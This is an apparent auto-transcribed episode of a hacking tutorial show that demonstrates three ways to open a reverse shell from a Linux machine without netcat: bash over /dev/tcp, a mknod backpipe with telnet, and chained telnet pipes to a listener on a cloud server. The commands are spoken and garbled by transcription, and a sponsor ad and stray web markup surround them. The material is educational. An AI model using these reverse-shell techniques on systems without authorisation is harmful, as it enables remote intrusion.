threads hello and welcome to hack tip
the show we will break down the concepts
tools and techniques for hackers gurus
in nineteen inches I'm your host Aaron
kitchen and today we're having fun with
a little bit of cats this is the
Internet and we're doing cats anyway
it's netcat you guys know net cat is
like an awesome Swiss Army knife of
tcp/ip when it comes to the Internet I
shouldn't have to explain to you already
you guys know that is like the quick and
dirty and easy way to set up a
communication between two machines
whether that's to Linux hosts or Windows
and a Mac and and Linux machine it's it
really doesn't matter because netcat is
universal and super easy because it
allows you to just over plain text talk
to one another and we're going to be
using it today to do what's called a
little bit of reverse shell action and
that is helpful for remote
administration and a mainly focusing on
the Linux platform right here
and what I'm going to be doing is
showing you how you can netcat without
using that cat there's plenty of ways to
do this exact thing if net cat is
installed on say our target machine the
machine that we want to do remote
administration on but we're going to be
pretending for example the machine were
that we want to remotely administer does
not have net cat just has your basic
tools that would come on a Windows
machine I'm sorry not a Windows machine
a Linux machine and we're going to be
focusing on being able to get an
interactive shell using bash so that's
slash bin slash bash and we're gonna
take that we're gonna put it through the
internet tubes with the kittens and it
will show up on the other end at a
virtual private server so on the right
here you'll see root at coconut this is
my server in the cloud where we are
going to be sending our traffic to and
this machine run by us we have netcat
installed on and we're going to go ahead
and start listening to our our target
machines here so first of all we need to
do NC for netcat Tech l4 listen tak n
for no dns and then tak VV for very
verbose and tak P for the port I'm just
going to use 8080 that port just gets
used for everything doesn't it and there
we go we're listening on port 8080
so over on the left window we have our
local machine and I'm gonna use the
first method is is actually going to be
really cool because I'm actually just
gonna use bin bash and then send that
through the internet using some dev TCP
actions so get this which so slash bin
slash bash and then if I use TAC I I can
now to redirect that to slash dev slash
TCP and in this case the IP address of
my server which is 173 to 14.1 73 151
and then slash the port 8080 and then
we're gonna go ahead and take care of
our standard input error and whatnot
with a little bit of 0 less than
ampersand 1 and then 2 greater than
ampersand 1 and then if I go ahead and
run that you're gonna notice on the
right suddenly my prompt doesn't say
root that coconut anymore no it says it
says Darin at DK 10 DK 10 being the host
name of this laptop here and now if I do
like LS I can see not only do I have my
prompt and I can enter commands I can
see the output of those commands and a
run clear and there we go and it's very
interactive is very easy and so if you
can just go ahead and issue bin bash on
your target you can go ahead and send it
through slash dev threat slash tcp is
just like a raw connection so super
simple now that method may not always
work on your target machine so for that
instance I'm gonna go ahead and exit
here in the cloud and I'm back to my
coconut and I'm gonna go ahead and
reissue my listener so again I'm
listening on port 8080 and we're gonna
use a little bit of a different method
here what I'm gonna do is use m'kay nod
and we're gonna do a little thing called
back piping so I'm gonna do a back pipe
and then P and then ampersand ampersand
and this time we're gonna use telnet
telnet should be on most any box that
you encounter so telnet and then to our
server 172 I'm sorry one seven three two
14173 151 space 8080 for the port and
then
we're gonna redirect back pipe into it
and then we're gonna pipe all of that to
slash bin slash bash and then redirect
her back pipe again and when I issue
that I get these three little errors
saying that it's not found but if you
look over here well it's because trying
connect and escape tell MIT aren't
commands and bash but if you look over
here it says I am now connected from the
unknown IP address and if I do an LS I
can see there are my files if I do clear
there we go
and you'll notice though that like if I
do PWD it'll show where I am on this
machine but I don't actually get the
prompt so it's not as pretty but there
you go just with using telnet and a
little bit of back piping redirection
we're able to create a net cat tunnel
straight up to our server in the cloud
now stay tuned because in just a bit
gonna show you my third very messy but
also really fun method for doing this
after we take a quick break if you love
alternative apparel brands like Kidrobot
Hurley and Stussy but hate wasting cash
heads up you can score up to 80% off
these premium brands every day at
Jackthreads the new invite only shopping
club just for guys there's normally a
waitlist to join but we've got the
hookup so head over to jack threads.com
slash hack 5 and join now for free to
get instant access to their hookups on
Street skate and surf wear brands we're
back and as you can see over on the
right here we have two windows now
because this one this one gets pretty
sticky so I have both of these windows
here are connected to my server in the
cloud and both of them are logged in to
coconut and we're taking a look in the
top one we're listening on port 8080
using netcat now for this I'm going to
have to start another listener using
netcat so listen Tech and tech very
verbose and eight will be the port we're
going to use okay so now I'm listening
on both 8080 and 8888 and what we're
going to do on our local machine to get
our information over there is uh a lot
of fun piping check this out we're going
to tell
net2 in this case the hostname is
coconut hack five org on port 8080
and then we're gonna pipe that to slash
bin slash bash and then we're gonna
apply that to telnet to coconut hack
five org on eight eight eight eight and
we go ahead and run that you'll notice
over on the top in the 8080 if I issue
for example LS down at the bottom I get
my output so if say I were to type PWD
in the top window I would see the answer
of the directory that I'm in in the
bottom window it's kind of a pain but
there you go using just some pipes and
telnet and bash which should be on your
system you can go ahead and create
yourselves a nice little reverse shell
back to you this is great for systems
administration or all sorts of other fun
stuff and it's been what I've been
toying with for a little bit with the
new pineapple and whatnot so I hope you
guys enjoy that and I have to give mad
props to Ramy for sending some of these
bye because when you encounter a system
that doesn't have netcat installed this
could really save your bacon okay well
if you guys have a tip or two go ahead
and hit us up feedback at hak5 org or
hack five dot org such nibbles is a
great place to send us some good stuff
as well and we'd love to hear your
feedback and of course check out hack 5
org where we have our system of show
hack 5 I'll be there reminding you to
trust your tech no left
hello and welcome to active but sure we
break down the tools talk onto that what
is it called</div></div><div class="container-fluid bottom-ad"><div id="amzn-assoc-ad-6a809dda-347a-4187-8a86-91faf94575da"></div><script async src="//z-na.amazon-adsystem.com/widgets/onejs?MarketPlace=US&amp;adInstanceId=6a809dda-347a-4187-8a86-91faf94575da"></script></div><div class="text-center">We are a participant in the Amazon Services LLC Associates Program, an affiliate advertising program designed to provide a means for us to earn fees by linking to Amazon.com and affiliated sites.</div><script>(function(w, d){
